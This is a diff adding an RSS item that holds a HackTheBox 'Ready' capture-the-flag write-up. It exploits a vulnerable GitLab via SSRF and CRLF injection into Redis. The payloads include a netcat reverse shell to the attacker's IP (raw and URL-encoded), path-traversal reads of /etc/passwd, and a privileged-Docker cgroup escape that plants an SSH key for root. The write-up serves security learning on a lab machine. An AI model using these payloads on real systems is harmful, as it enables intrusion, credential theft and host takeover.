@@ -33,6 +33,154 @@
     </item>
     
     <item>
+      <title>HackTheBox - Ready Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-ready/</link>
+      <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-ready/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorred-information-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34; &gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;nmap.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;We only have two ports open&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;22/SSH : OpenSSH 8.2p1 Ubuntu 4&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;5080/http : nginx&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-serverp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server&lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;webpage.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;We get a simple Gitlab sign in page. First let&amp;rsquo;s make an account&lt;/p&gt;
+&lt;img src=&#34;register.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;Now let&amp;rsquo;s look for a version or anything that could help us.&lt;/p&gt;
+&lt;img src=&#34;gitlab_version.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;We get the gitlab&amp;rsquo;s version and an interesting &lt;code&gt;update asap&lt;/code&gt; highlighted in red, Which means it probably vulnerable&lt;/p&gt;
+&lt;img src=&#34;google_poc.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And yeah..! we were right&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Most of the POCs and github repositories were published after the box being launched, so we we won&amp;rsquo;t be using them and we&amp;rsquo;ll do everything manually and get our hands dirty first.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;p-stylecolorred-foothold--user-flag-intended-wayp&#34;&gt;&lt;p style=&#34;color:RED&#34; &gt;Foothold &amp;amp; User Flag (Intended way)&lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Looking at the latest commits, we can understand what we&amp;rsquo;re going to exploit&lt;/p&gt;
+&lt;img src=&#34;commits.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;&amp;mdash;&amp;gt; So basically, we&amp;rsquo;re going to bypass the SSRF protection using special IPv6 Addresses as we in the previous picture&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://[0:0:0:0:0:ffff:127.0.0.1]/foo/foo.git
+https://[::ffff:127.0.0.1]/foo/foo.git
+etc..
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Going back to the commit history, we can see another interesting vulnerability&lt;/p&gt;
+&lt;img src=&#34;CRLF.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;img src=&#34;CRLF1.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;This vulnerability will come handy later on by adding newlines to our payload and that&amp;rsquo;s by chaining both of these vulnerabilities in order to get an RCE.&lt;/p&gt;
+&lt;p&gt;So now we understood what will be causing the RCE, we can dive in and get our shell!&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll be using the payload mentioned here: &lt;a href=&#34;https://hackerone.com/reports/299473&#34;&gt;https://hackerone.com/reports/299473&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &amp;quot;{\&amp;quot;class\&amp;quot;:\&amp;quot;GitlabShellWorker\&amp;quot;,\&amp;quot;args\&amp;quot;:[\&amp;quot;class_eval\&amp;quot;,\&amp;quot;open(\&#39;|whoami | nc &amp;lt;ip&amp;gt; 80\&#39;).read\&amp;quot;],\&amp;quot;retry\&amp;quot;:3,\&amp;quot;queue\&amp;quot;:\&amp;quot;system_hook_push\&amp;quot;,\&amp;quot;jid\&amp;quot;:\&amp;quot;ad52abc5641173e217eb2e52\&amp;quot;,\&amp;quot;created_at\&amp;quot;:1513714403.8122594,\&amp;quot;enqueued_at\&amp;quot;:1513714403.8129568}&amp;quot;
+ exec
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let&amp;rsquo;s chain both the two previous vulnerabilities.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Before throwing a reverse shell, ping your machine first to confirm that we have code exec on the machine. for the sake of the writeup i&amp;rsquo;ll be getting directly a reverse shell&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &amp;quot;{\&amp;quot;class\&amp;quot;:\&amp;quot;GitlabShellWorker\&amp;quot;,\&amp;quot;args\&amp;quot;:[\&amp;quot;class_eval\&amp;quot;,\&amp;quot;open(\&#39;|nc 10.10.14.17 4444 -e /bin/bash \&#39;).read\&amp;quot;],\&amp;quot;retry\&amp;quot;:3,\&amp;quot;queue\&amp;quot;:\&amp;quot;system_hook_push\&amp;quot;,\&amp;quot;jid\&amp;quot;:\&amp;quot;ad52abc5641173e217eb2e52\&amp;quot;,\&amp;quot;created_at\&amp;quot;:1513714403.8122594,\&amp;quot;enqueued_at\&amp;quot;:1513714403.8129568}&amp;quot;
+ exec
+ exec
+/elleuch.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We URL encode our payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/A%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Cnc%2010.10.14.17%204444%20-e%20%2Fbin%2Fbash%20%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/elleuch.git
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So now we have a ready-to-use payload, let&amp;rsquo;s back to the web page to see where we&amp;rsquo;re gonna throw it&lt;/p&gt;
+&lt;img src=&#34;repo.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And yeah! We can import projects by URLs, Exactly what we needed&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s use our payload and set a listener and see if we get a shell&lt;/p&gt;
+&lt;img src=&#34;rev1.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s get a proper shell&lt;/p&gt;
+&lt;img src=&#34;stable.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And grab the user.txt&lt;/p&gt;
+&lt;img src=&#34;user.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorreduser-flag-unintended-wayp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Flag (Unintended way)&lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;When i first rooted the box, it seemed to be also vulnerable to&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Arbitrary file read via the UploadsRewriter when moving an issue&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;That we already done in &lt;a href=&#34;https://mohamed-elleuch.me/writeups/htb-laboratory/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Laboratory Writeup&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I am not sure if the creator patched it or no, but  you can still try it !&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Step1 : Get /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Step2 : Get /home/dude/user.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/dude/user.txt)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privesc-method-1-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc (Method 1 )&lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;After enumerating a bit, we can find an interesting file&lt;/p&gt;
+&lt;img src=&#34;rb.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;Which contains a password&lt;/p&gt;
+&lt;img src=&#34;pass.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And it turns out to be the password the root of this docker container&lt;/p&gt;
+&lt;img src=&#34;rootdocker.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;Now our goal is to escape it !&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s check the &lt;code&gt;/opt/backup/docker-compose.yml&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;Priv.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;It seems like we&amp;rsquo;re in a privileged docker!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;An interesting blog post to check ! &lt;a href=&#34;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&#34;&gt;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x
+ 
+echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release
+host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
+echo &amp;quot;$host_path/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent
+ 
+echo &#39;#!/bin/sh&#39; &amp;gt; /cmd
+echo &amp;quot;echo &#39;public_rsa&#39; &amp;gt; /root/.ssh/authorized_keys &amp;quot; &amp;gt;&amp;gt; /cmd
+chmod a+x /cmd
+ 
+sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;root.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;And voilà we&amp;rsquo;re root!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privesc-method-2p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc (Method 2)&lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Way simpler than first one!&lt;/p&gt;
+&lt;p&gt;First let&amp;rsquo;s check mounts&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;df -aTh   # Or mount -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;dev.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;let&amp;rsquo;s try to mount &lt;code&gt;/dev/sda2&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;myroot.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+And yeaah! we can access the box&#39;s file system
+&lt;p&gt;Let&amp;rsquo;s check if we can grab the root flag and it&amp;rsquo;s ssh private key&lt;/p&gt;
+&lt;img src=&#34;ssh.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;p&gt;Now let&amp;rsquo;s ssh into root with his key&lt;/p&gt;
+&lt;img src=&#34;last.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>CyberTalents - Crashed Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/ct-crashed/</link>
       <pubDate>Mon, 19 Apr 2021 00:00:00 +0000</pubDate>
